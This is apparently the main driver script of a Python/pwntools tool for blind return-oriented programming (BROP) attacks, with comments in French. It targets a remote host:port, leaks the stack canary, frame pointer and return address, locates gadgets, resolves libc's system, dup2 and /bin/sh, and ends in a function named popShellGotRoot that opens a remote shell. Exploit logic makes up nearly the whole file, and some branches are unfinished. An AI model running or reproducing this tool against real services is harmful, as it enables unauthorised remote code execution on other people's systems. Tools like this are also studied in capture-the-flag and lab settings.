#!/usr/bin/python3

import argparse
import sys
import binadr
import libcadr
import shell
from bk_class import ExploitMethods
import print_tools as pt
import _info_file as infoFile

from pwn import *

def checkParameter():

    parser              = argparse.ArgumentParser()
    conflict_buildid    = parser.add_mutually_exclusive_group()
    conflict_values     = parser.add_mutually_exclusive_group()

    parser.add_argument("target",               help="give target parameters; use following syntax: host:port", type=str)

    parser.add_argument("-a", "--architecture", help="indicate architecture and env ; use 0 to get more information", choices = [0, 1, 2, 3, 4], type=int)

    parser.add_argument("-d", "--debug",        help="show debugging informations during execution", action="store_true")
    parser.add_argument("-e", "--exploit",      help="launching standard exploitation ; use 0 to get more information", choices = [0, 1, 2], default = 2, type=int)
    parser.add_argument("-s", "--silent",       help="make pwntools silent", action="store_true")

    # Pour celle-là, voir si on remplit les valeurs à la demande ou directement en une seule chaine.
    conflict_values.add_argument("-hf", "--handvalues_full",  help="tell the script to ask for all necessary values for exploitation ; better use --from-file option to avoid mistake", action="store_true")
    conflict_values.add_argument("-hv", "--handvalues",  help="tell the script to ask for the three main leaked values (canary, EBP/RBP, return address)", action="store_true")
    conflict_values.add_argument("-f", "--from_file",  help="use values set manually in a json file ; use -fe to get an example", action="store_true")
    conflict_values.add_argument("-fe", "--file_example",  help="show an example of a json object that embeds all necessary values for exploitation", action="store_true")
    conflict_values.add_argument("-ge", "--generate_file",  help="create a template of the file in the current directory (values has to be completed by your own)", action="store_true")

    parser.add_argument("-p", "--pause",        help="set a value for the sleep() function; default is 0.03s", type=int, default = 0.05)

    # éventuellement une option pour le padding (buffer avant l'overwrite)

    conflict_buildid.add_argument("-b", "--buildid",        help="pass buildid for specific libc", type=str)
    conflict_buildid.add_argument("-n", "--nolibcleak", help="don't perform libc leak ; be sure you already have a libc fragment from which read a BuildID", action="store_true")
    return parser.parse_args()


    # Check target format

def define_verbosity(args):
    if args.silent:
        context.log_level='error'
    elif args.debug:
        context.log_level='debug'
    return None

def get_target(param_object):
        ids = param_object.target
        try:
            host = ids.split(':')[0]
            port = int(ids.split(':')[1], 10)
        except IndexError:
            pt.printError("Wrong host/port ; target should have the following format : hostname:port")
        except ValueError:
            pt.printError("Wrong port format")
        return host, port

def get_exploit_type(param_object):
    if param_object.exploit == 1:
        pt.printInfo("Starting simple leak attack.")
        # TODO e_s  = binadr.leakValues(ee)
        exit(pt.printDone + "All 'Leakable' values have been leaked")
    elif param_object.exploit == 2:
        pt.printInfo("Starting standard exploitation.")
    else:
        infoFile.exploitInfo()
    return param_object.exploit

def get_architecture(param_object):
    if param_object.architecture == 0:
        infoFile.infoArch()
    elif param_object.architecture == 4:
        printWarning("ARM architecture option is not implemented yet")
        exit(0)
    else:
        return args.architecture

def about_leaked_values(args):
    if args.handvalues_full:
        return "h_f"
    elif args.handvalues:
        return "h_v"
    elif args.from_file:
        return "f_f"
    elif args.generate_file:
        return "g_f"
    elif args.file_example:
        return "f_e"
    else:
        return ""

# get current os
# import platform
# cur_os.append(platform.system())


    # ExploitStructure.hand = args.handvalues
    # if args.pause:
        # ExploitStructure.DODO = args.pause

    # ExploitStructure.no_lib_leak   = args.nolibcleak
    # if args.buildid:
        # ExploitStructure.BUILDID = args.buildid
        # BUILDIDOK = checkBuildID(ExploitStructure.BUILDID)
        # if (BUILDIDOK != 1):
            # printError("BuildID error, can't exploit the binary")
            # exit(1)

        # ExploitStructure.no_lib_leak   = True


    
#mettre une infor conernant le non leak si buildid, ainsi qu'empêcher les deux options



#####

def stopGadget(ExploitStructure):
    TMP = ExploitStructure
    TMP.stop_gadget  = binadr.getStopGadget(TMP)
    pt.crPrint('stop_gadget ', TMP.stop_gadget, 1)
    binadr.test_gadget(TMP, 'stop_gadget')

def bropGadget(ExploitStructure):
    ExploitStructure.brop_gadget  = binadr.get_brop_gadget(ExploitStructure)
    pt.crPrint('brop_gadget ', ExploitStructure.brop_gadget, 1)
    binadr.test_gadget(ExploitStructure, 'brop_gadget')

def libcBase(ExploitStructure):
    ExploitStructure.libc_base = libcadr.get_libc_base(ExploitStructure)
    pt.crPrint('libc_base   ', ExploitStructure.libc_base, 1)
    binadr.test_gadget(ExploitStructure, 'leak_adr')


def leakLib(ExploitStructure):
    if (ExploitStructure.no_lib_leak):
        return
    if ExploitStructure.build_id:
        return
    libcadr.leakStuff(ExploitStructure)

def symboles(ExploitStructure):
    ExploitStructure.system, ExploitStructure.dup2, ExploitStructure.binsh = libcadr.getSymboles(ExploitStructure) 
    pt.crPrint('dup2       ', ExploitStructure.system, 0)
    pt.crPrint('system     ', ExploitStructure.dup2, 0)
    pt.crPrint('binsh      ', ExploitStructure.binsh, 0)

def popShellGotRoot(ExploitStructure):
    shell.exploit(ExploitStructure)


#####

def main():

    e_s = ExploitMethods()
    param_object = checkParameter()
    define_verbosity(param_object)

    e_s.host, e_s.port = get_target(param_object)

    e_s.exploit = get_exploit_type(param_object)

    e_s.arch = get_architecture(param_object)

    e_s.hand = about_leaked_values(param_object)

    if e_s.hand:
        if e_s.hand == "g_f":
            # TODO generate_leaked_values_file()
            print('g_f')
        elif e_s.hand == "f_f":
            # TODO get_values_from_file()
            print('f_f')
        elif e_s.hand == "h_v":
            e_s.canary = p64(0x551ff4b2335f0500)
            e_s.rbp    = p64(0x00007ffe867e5300)
            e_s.retadr = p64(0x00007f183500f23e)
            print('h_v')
        elif e_s.hand == "h_f":
            # TODO use full hand value
            print('h_f')
        else: # Default behaviour if self.hand is wrong
            infoFile.printFileValuesExample()
    else: # e_s.hand should be ""
            # leaking value
            pt.printInfo("Starting standard exploitation from scratch...")
            print('todo')

            # Voir si je propose quand-même de passer CANARY RBP et RETADR
            # if e_s.hand == :
                # pt.printDiscretInfo("Using manual values.")
                # exit()
                # crPrint('CANARY     ', ee.CANARY, 0)
                # crPrint('RBP        ', ee.RBP, 0)
                # crPrint('RETADR     ', ee.RETADR, 0)
            # else:
            if not e_s.leak_values(e_s.buffer):#voir la façon de faire dont Florian m'a parlée pour appeler ça
                exit(1)

    e_s.stop_gadget = binadr.get_stop_gadget(e_s)
    e_s.brop_gadget = binadr.get_brop_gadget(e_s)

    e_s.leak_adr, e_s.bin_base = binadr.get_leak_function(e_s)
    pt.crPrint('bin_base    ', e_s.bin_base, 0)
    pt.crPrint('leak_adr    ', e_s.leak_adr, 1)
    binadr.test_gadget(e_s, 'leak_adr')

    libcBase(e_s)
    e_s.leak_adr, e_s.bin_base = binadr.get_leak_function(e_s)

    if param_object.buildid:
        e_s.build_id = param_object.buildid
    elif param_object.nolibcleak:
        e_s.no_lib_leak = True
    leakLib(e_s)
    symboles(e_s)

    popShellGotRoot(e_s)

    exit(':D')
    


if __name__ == '__main__':
    main()
